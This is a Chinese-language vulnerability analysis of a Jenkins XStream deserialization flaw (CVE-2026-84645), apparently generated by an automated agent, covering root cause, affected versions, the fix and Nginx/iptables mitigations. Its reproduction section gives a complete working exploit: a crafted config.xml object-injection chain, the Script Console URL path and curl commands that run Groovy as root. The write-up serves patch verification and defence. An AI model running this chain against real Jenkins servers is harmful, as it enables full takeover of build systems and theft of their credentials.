---
title: Jenkins 嵌套 PersistenceRoot 反序列化远程代码执行漏洞（CVE-2026-84645）
date: 2026-09-06
publishedAt: 2026-09-06T14:24:53+08:00
category: 漏洞分析
summary: 分析 Jenkins core XStream 反序列化器未阻止 PersistenceRoot 对象作为嵌套字段注入的根因，实测提交作业 config.xml 构造 FingerprintAction→FreeStyleBuild→FreeStyleProject→Hudson 注入链，经 Stapler 路由到达未受保护的 Script Console 以 root 执行任意 Groovy，并验证 2.580 守卫修复与 Nginx 拦截缓解。
slug: jenkins-persistenceroot-deserialization-rce
coverText: Jenkins
badge: 定风波Agent复现
published: true
---

> **实验说明：** 本文全部 PoC 与攻击流量均在授权隔离靶场（自建 Jenkins Docker 环境）中完成实测，仅用于漏洞研究与修复验证。请勿对未授权目标实施类似测试。

> CVE-2026-84645 / SECURITY-3972 · Jenkins core · CVSS 3.1 8.8（HIGH）· 已实测完整 RCE 链

## 漏洞简介

- **CVE 编号**：CVE-2026-84645
- **厂商内部编号**：SECURITY-3972
- **产品**：Jenkins core（开源 CI/CD 服务器，Java）
- **漏洞类型**：反序列化导致远程代码执行（CWE-94 Improper Control of Generation of Code / CWE-915 Improperly Controlled Modification of Dynamically-Determined Object Attributes）
- **Disclosure Date**：2026-09-02（Jenkins 官方公告发布日；CVE 保留于 2026-09-01，CNA 记录 2026-09-02 发布）
- **报告渠道**：Jenkins Bug Bounty Program（欧盟委员会赞助）[来源：官方公告]

### Triage 评分

| 维度 | 分值 | 依据 |
|------|------|------|
| 危害分 | 8.8/10 | NVD 记录 CVSS 3.1 Secondary（CISA ADP Vulnrichment）：`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`（[NVD 详情](https://nvd.nist.gov/vuln/detail/CVE-2026-84645)，NVD 状态 Undergoing Analysis，无 Primary 分，取 Secondary 8.8） |
| 可信度分 | 8.9/10 | 信息可信度说明表：已确认 8 条 / 共 9 条 × 10 |
| 实测分 | 10/10 | 真实环境实测（Jenkins 2.579 官方 war + Docker）完整 RCE：注入 → Stapler 路由 → Script Console → root 身份执行 Groovy + 落地文件；Phase 3c 反自欺六项取证通过（`D:\X\CVE-2026-84645_verify.md`） |
| **综合** | **9.1/10** | 0.5×8.8 + 0.3×8.9 + 0.2×10 = 9.07 ≈ 9.1 |

### 信息可信度说明

| 可信度 | 内容 | 依据 |
|--------|------|------|
| 已确认 | 漏洞存在与根因（嵌套 PersistenceRoot 反序列化 + Stapler 路由 → RCE） | NVD 描述 + CVE.org CNA 记录 + 官方公告 SECURITY-3972 三源一致 |
| 已确认 | 受影响版本：weekly ≤2.579、LTS ≤2.568.2 | NVD CPE（2.580/2.568.3 unaffected，defaultStatus affected）+ CNA + 官方公告三源一致 |
| 已确认 | 修复版本：2.580（weekly）、2.568.3（LTS），2026-09-02 发布 | 官方公告 + jenkins.io changelog（2.580 条目：2026-09-02 "Security Important security fixes"） |
| 已确认 | CVSS 8.8 与向量 | NVD 记录内 CISA ADP Vulnrichment metrics + GHSA cvss_v3 一致 |
| 已确认 | CWE-94 / CWE-915 | NVD weaknesses + CVE.org ADP problemTypes |
| 已确认 | 修复 commit `0d731367e08656f8cd1e8275f0e820f97af07fc6`（8 文件 +190/-6） | GitHub commit API 检索 `[SECURITY-3972]` 唯一命中 + 文件列表实读 |
| 已确认 | 守卫逻辑：`RobustReflectionConverter` 拒绝嵌套 PersistenceRoot 字段反序列化，三种安全模式（reference= 回引 / resolves-to Replacer / SingleValueConverter），异常消息 "Refusing to unmarshal PersistenceRoot subtype ..." | patch diff 实读（commit 0d73136）+ 2.580 靶场实测日志逐字命中 |
| 已确认 | 完整 RCE 链：`FingerprintAction`（transient `Run build`）→ `FreeStyleBuild`（transient `Job project`）→ `FreeStyleProject`（transient `ItemGroup parent`）→ `Hudson`（注入 `authorizationStrategy`），URL `/job/<name>/fingerprints/run/parent/parent/script` 到达未受保护 Script Console，attacker 以 root 执行任意 Groovy | 本报告 Phase 3b 实测：2.579 注入 200 + `/script` 200 + scriptText 返回 `RCE_MARKER_84645_root` + `/tmp/rce-proof-84645` 落地；2.580 同链 404 无执行无副作用（见后文行为矩阵） |
| 未知 | 原始 Bug Bounty 报告者的具体构造（本报告 RCE 链为独立复现，与报告者构造是否一致未知）；公开 PoC/媒体覆盖 | [NOT FOUND: 搜索了 NVD references、GitHub Advisory、Google News RSS×2、DuckDuckGo——发布仅 2 天无公开 PoC/报道] |

## 漏洞描述

Jenkins 是使用最广泛的开源自动化服务器，用于构建、测试和部署软件。它通过 Java 的 XStream 库对各类配置文件（如作业的 `config.xml`）进行序列化与反序列化，并使用 Stapler Web 框架基于反射命名约定将 HTTP 请求路由到内存对象图。

由于 Jenkins 的 XStream 反序列化器在处理用户提交的 `config.xml` 文档时，未阻止将标记为把配置存储在独立顶级配置文件中的对象类型（实现 `PersistenceRoot` 接口，如作业、构建、代理乃至 Jenkins 根配置对象）作为其他对象的嵌套字段值反序列化，持相应权限（提交 job config.xml 需 Item/Configure，结合官方 CVSS 向量 PR:L 推断为 Overall/Read + Item/Configure）的攻击者可通过向作业的 `config.xml` 端点提交特制 XML，把此类对象注入 Jenkins 内存对象图。被注入的对象随后经 Stapler 的反射式请求路由处理 HTTP 请求（实测：注入对象的 URL 页面返回 200）。攻击者组合多个此类对象可构造到达未妥善保护的 Script Console 的 URL 路径——注入的 Jenkins 实例用攻击者在 XML 中自带指定的授权策略做权限检查，绕过真实系统的授权配置——最终以运行 Jenkins 的操作系统用户身份执行任意 Groovy 代码，造成远程代码执行（实测以 root 身份执行成功）。修复后的 Jenkins 2.580 与 LTS 2.568.3 阻止此类类型作为其他对象的嵌套字段值被反序列化。

## 影响版本与利用条件

**受影响版本**：

- weekly：`2.579 及更早`（2.580 起不受影响）
- LTS：`2.568.2 及更早`（2.568.3 起不受影响）

**利用条件**：攻击者需为 Jenkins 登录用户并持有对至少一个 job 的 Item/Configure 权限（可提交该 job 的 `config.xml`），无需管理员权限。

## 环境搭建

- 目标：Jenkins **2.579**（受影响版）+ 对照组 Jenkins **2.580**（修复版）
- 环境：CentOS 7 Docker 宿主机（10.10.10.10），`maven:3.9.6-eclipse-temurin-17` 镜像 + 外挂 JDK21 运行官方 war（war 来自 get.jenkins.io 官方直链经清华镜像，字节数 53,725,839 / 53,729,873 与官方 HEAD 一致）
- 靶场配置：Jenkins 自建用户数据库，attacker 为普通登录用户（提交 config.xml 的权限与官方 CVSS PR:L 语义对应）；2.579 与 2.580 配置完全相同
- 攻击者账户：`attacker / attacker123`（非管理员）

## 漏洞复现（实测，2026-09-04）

### STEP 1 — 建立载体 job

以 admin 登录创建普通 FreeStyle job `carrier`（POST `/createItem?name=carrier`，标准 config.xml，HTTP 200）。attacker 拥有对该 job 的 Item/Configure 权限即可，无需管理员。

### STEP 2 — attacker 提交注入 config.xml（核心攻击请求）

```http
POST /job/carrier/config.xml HTTP/1.1
Host: 127.0.0.1:8057
Authorization: Basic YXR0YWNrZXI6YXR0YWNrZXIxMjM=
Content-Type: application/xml
Jenkins-Crumb: <attacker 会话 crumb>

<?xml version="1.1" encoding="UTF-8"?>
<project>
  <actions>
    <hudson.tasks.Fingerprinter_-FingerprintAction>
      <build class="hudson.model.FreeStyleBuild">
        <queueId>0</queueId><timestamp>0</timestamp><startTime>0</startTime>
        <duration>0</duration><charset>UTF-8</charset><keepLog>false</keepLog><built>false</built>
        <project class="hudson.model.FreeStyleProject">
          <actions/>
          <description>pwned</description>
          <keepDependencies>false</keepDependencies>
          <properties/>
          <scm class="hudson.scm.NullSCM"/>
          <canRoam>true</canRoam>
          <disabled>false</disabled>
          <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>
          <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>
          <triggers/>
          <concurrentBuild>false</concurrentBuild>
          <builders/>
          <publishers/>
          <buildWrappers/>
          <parent class="hudson.model.Hudson">
            <authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy"/>
          </parent>
        </project>
      </build>
    </hudson.tasks.Fingerprinter_-FingerprintAction>
  </actions>
  <description>carrier</description>
  <keepDependencies>false</keepDependencies>
  <properties/>
  <scm class="hudson.scm.NullSCM"/>
  <canRoam>true</canRoam>
  <disabled>false</disabled>
  <triggers/>
  <concurrentBuild>false</concurrentBuild>
  <builders/>
  <publishers/>
  <buildWrappers/>
</project>
```

**实测响应（2.579）**：`HTTP/1.1 200`——反序列化成功，嵌套对象图进入内存（`FingerprintAction.build` 为 transient，不落盘，存活于内存对象图）。

### STEP 3 — Stapler 逐段导航到注入的 Script Console

```http
GET /job/carrier/fingerprints/run/parent/parent/script HTTP/1.1
Host: 127.0.0.1:8057
Authorization: Basic YXR0YWNrZXI6YXR0YWNrZXIxMjM=
```

**实测响应（2.579）**：`HTTP/1.1 200`（88,387 字节，Jenkins Script Console 页面）。逐段实测：`fingerprints/` → 200（注入的 FingerprintAction 页面）、`fingerprints/run/` → 200（注入的 FreeStyleBuild 页面）、`fingerprints/run/parent/` → 200（注入的 FreeStyleProject 页面，描述显示 pwned）、`.../parent/parent/script` → 200（注入的 Hudson 实例上的 Script Console）。

### STEP 4 — 提交 Groovy 执行任意代码（RCE 验收）

```http
POST /job/carrier/fingerprints/run/parent/parent/scriptText HTTP/1.1
Host: 127.0.0.1:8057
Authorization: Basic YXR0YWNrZXI6YXR0YWNrZXIxMjM=
Content-Type: application/x-www-form-urlencoded
Jenkins-Crumb: <attacker 会话 crumb>
Cookie: JSESSIONID.3dadf1ed=node0dnyhdfbaajem1q30rqe4hutms1.node0
Content-Length: 85

script=println+"RCE_MARKER_84645_"+System.getProperty("user.name")...（实测提交的 Groovy，见下）
```

实际提交的 Groovy（form-encoded 前的原文）：

```groovy
println "RCE_MARKER_84645_" + System.getProperty("user.name") + "_" + new Date().toString(); new File("/tmp/rce-proof-84645").text = "pwned-by-cve-2026-84645 at " + new Date()
```

**实测响应（2.579，真实流量）**：

```text
RCE_MARKER_84645_root_Fri Sep 04 03:13:57 UTC 2026
Result: pwned-by-cve-2026-84645 at Fri Sep 04 03:13:57 UTC 2026
```

**独立副作用验证**（docker exec 容器内查看，证明代码运行在 Jenkins JVM 进程内）：

```bash
# docker exec j579 cat /tmp/rce-proof-84645
pwned-by-cve-2026-84645 at Fri Sep 04 03:13:57 UTC 2026
```

Jenkins 进程以容器 root 用户运行（ps 确认 PID 1 为 `java -jar jenkins-2.579.war`），故 Groovy 以 root 身份执行。四验收齐备：真二进制（官方 war）、真代码路径（Stapler 路由链全 200）、真进程执行（JVM 内 `System.getProperty("user.name")` 返回 root）、真副作用（容器内文件落地）。

### STEP Over — 修复版对照矩阵（全部实测）

| 行为 | Jenkins 2.579（受影响） | Jenkins 2.580（修复） |
|---|---|---|
| 提交注入 config.xml | 200，对象图注入成功 | 200，但 transient 字段被静默忽略（同公告 SECURITY-4032 修复行为），注入失败 |
| 用非 transient 持久字段（`PermalinkEntryAction.build`）注入 | 200 且持久化（readback 含注入对象） | **500 + 日志 `Refusing to unmarshal PersistenceRoot subtype 'hudson.model.FreeStyleBuild' into field 'build' in 'jenkins.model.job.PermalinksAction$PermalinkEntryAction'`，config.xml 未被污染** |
| `GET .../parent/parent/script` | 200（Script Console 页面） | 404（注入链不存在） |
| `POST .../scriptText` 执行 Groovy | 200，`RCE_MARKER_84645_root` + 文件落地 | 404，无执行 |
| `/tmp/rce-proof-84645` 副作用 | 存在 | 不存在 |

### 可独立复现的 curl 命令（三段式）

```bash
# [阶段1] 获取会话与 crumb（attacker 为任意可提交 config.xml 的普通用户）
curl -s -u attacker:attacker123 -c /tmp/cj.txt http://127.0.0.1:8057/crumbIssuer/api/json
#   → {"_class":"hudson.security.csrf.DefaultCrumbIssuer","crumb":"<CRUMB>",...}

# [阶段2] 提交注入 payload（car11.xml 内容见 STEP 2）
curl -s -u attacker:attacker123 -b /tmp/cj.txt \
  -H "Jenkins-Crumb: <CRUMB>" -X POST -H 'Content-Type: application/xml' \
  --data-binary @car11.xml http://127.0.0.1:8057/job/carrier/config.xml
#   → 200

# [阶段3] 验证 RCE（marker 输出 + 文件副作用）
curl -s -u attacker:attacker123 -b /tmp/cj.txt -H "Jenkins-Crumb: <CRUMB>" \
  -X POST http://127.0.0.1:8057/job/carrier/fingerprints/run/parent/parent/scriptText \
  --data-urlencode 'script=println "RCE_MARKER_" + System.getProperty("user.name"); new File("/tmp/rce-proof").text = "pwned"'
#   → RCE_MARKER_root（Jenkins 以 root 运行时）
```

## 漏洞分析

### 攻击原理

config.xml 中把实现 `PersistenceRoot` 接口的对象作为嵌套字段值注入。利用链（每层均来自 `jenkins-core-2.579.jar` 内真实类，无任何自定义类）：

`hudson.tasks.Fingerprinter$FingerprintAction`（transient `Run build` 字段）→ `hudson.model.FreeStyleBuild`（transient `Job project` 字段）→ `hudson.model.FreeStyleProject`（transient `ItemGroup parent` 字段）→ `hudson.model.Hudson`（注入非 transient `authorizationStrategy` 字段为 `FullControlOnceLoggedInAuthorizationStrategy`）。

注入后 Stapler 逐 getter 导航（`getDynamic` → `getUrlName`="fingerprints" → `getRun()` → `getParent()` → `getParent()`），到达注入的 Hudson 实例；其 `getTarget()`（StaplerProxy）的权限检查使用注入实例自带的 `authorizationStrategy`（攻击者在 XML 中指定）而非真实系统配置——即公告所称"未妥善保护的 Script Console"。

## 修复建议

### 官方修复

升级到 Jenkins **2.580**（weekly）或 **LTS 2.568.3**。修复 commit 在 `RobustReflectionConverter.doUnmarshal` 中新增守卫：字段类型为 `PersistenceRoot` 子类型时，仅当满足三种安全模式（XStream `reference=` 反向引用、`resolves-to` 指向非 PersistenceRoot 的 Replacer 占位类型、或该类型注册了 SingleValueConverter）才允许反序列化，否则抛出 `CriticalXStreamException` 拒绝整个文档；同时 `Jenkins.readResolve()` 拒绝在单例已存在时反序列化第二个 Jenkins 实例。

**升级命令**：

```bash
# weekly 用户：下载 2.580 war 替换旧 war 后重启 Jenkins 进程
wget https://get.jenkins.io/war/2.580/jenkins.war -O jenkins.war
# LTS 用户：
wget https://get.jenkins.io/war-stable/2.568.3/jenkins.war -O jenkins.war
# 替换 war 后重启 Jenkins 进程（systemctl restart jenkins 或重启容器）
# Docker 用户：参考官方镜像 tag 页选择对应版本 https://hub.docker.com/r/jenkins/jenkins/tags
# （注：具体 tag 存在性本环境未验证，以 tag 页为准；war 直链已逐一 HEAD 验证）
```

### 临时缓解

以下缓解不替代升级，均为升级前的临时措施：

1. **反向代理拦截非授信源对 config.xml 的写操作**（Nginx 示例，仅允许管理网段 POST，其余 403）：

   ```nginx
   location ~ ^/job/[^/]+/config\.xml$ {
       limit_except GET {
           allow 10.0.0.0/8;   # 管理网段
           deny all;
       }
       proxy_pass http://jenkins_upstream;
   }
   ```

   实测依据：本漏洞攻击入口即 `POST /job/<name>/config.xml`（STEP 2），拦截该写操作即切断注入入口；但对其他接受用户 XML 的端点（view、agent 配置）应同法覆盖。

   **Phase 4 实测（nginx:1.26-alpine 反代 + limit_except，2026-09-04）**：非白名单源 POST config.xml → **403**；绕过变体测试（路径参数 `config.xml%3bjsessionid=x`、双重编码 `carrier%252fconfig.xml`、大小写 `JOB/.../CONFIG.XML`、尾分号 `config.xml;`）全部**未绕过**（404/400）。注意：limit_except 的 allow 判定的是**直连源 IP**，反代架构下需用 real client IP（X-Forwarded-For + realip 模块）才能区分穿透多层代理的原始客户端。

   **边界说明**：本缓解只阻断新注入，不清理已注入对象图——发现已被注入的实例需**重启 Jenkins**（transient 注入链重启后消失，持久注入链需同时检查 config.xml 是否被污染）。

2. **网络层收敛 Jenkins 管理面暴露**（iptables，仅允许可信网段访问 8080）：

   ```bash
   iptables -A INPUT -p tcp --dport 8080 -s 10.0.0.0/8 -j ACCEPT
   iptables -A INPUT -p tcp --dport 8080 -j DROP
   ```

3. **收紧 Item/Configure 授权并审计异常 Script Console 访问**：本攻击链要求攻击者可提交 job config.xml（Item/Configure）。在矩阵授权中仅向可信管理员授予；同时在 System Log 新建 recorder 记录 `jenkins.model.Jenkins` 与 `hudson.util.RobustReflectionConverter`（WARNING 级），2.580 的守卫日志与异常序列化行为（"Refusing to unmarshal"、writeReplace 异常）会在此暴露注入尝试。厂商未提供针对此漏洞的专用回退开关或系统属性（来源：官方公告无 mitigations 字段，公告对同批次其他漏洞给出的缓解不适用于本漏洞）。

   **Phase 4 实测**：无 Item/Configure 权限的匿名会话 POST config.xml → **403**（对照组持权用户 → 200），权限收紧对该攻击面有效。

## 参考链接

| CVE | Advisory URL | Commit URL | Download URL |
|-----|--------------|------------|--------------|
| CVE-2026-84645 | [Jenkins SECURITY-3972 公告](https://www.jenkins.io/security/advisory/2026-09-02/#SECURITY-3972) | [jenkinsci/jenkins 0d73136 修复提交](https://github.com/jenkinsci/jenkins/commit/0d731367e08656f8cd1e8275f0e820f97af07fc6) | [jenkins.war 2.580（weekly）](https://get.jenkins.io/war/2.580/jenkins.war) · [jenkins.war 2.568.3（LTS）](https://get.jenkins.io/war-stable/2.568.3/jenkins.war) |

辅助来源：

- [NVD — CVE-2026-84645](https://nvd.nist.gov/vuln/detail/CVE-2026-84645)
- [GHSA-g5fg-fmcm-8xx6](https://github.com/advisories/GHSA-g5fg-fmcm-8xx6)
- [Jenkins Changelog（2.580，2026-09-02）](https://www.jenkins.io/changelog/)

---

*文档生成：pi agent · /hunt → /cve 流水线 · Phase 0-4（2026-09-04）· 实测靶场保留于 10.10.10.10（j579:8057 / j580:8058）*
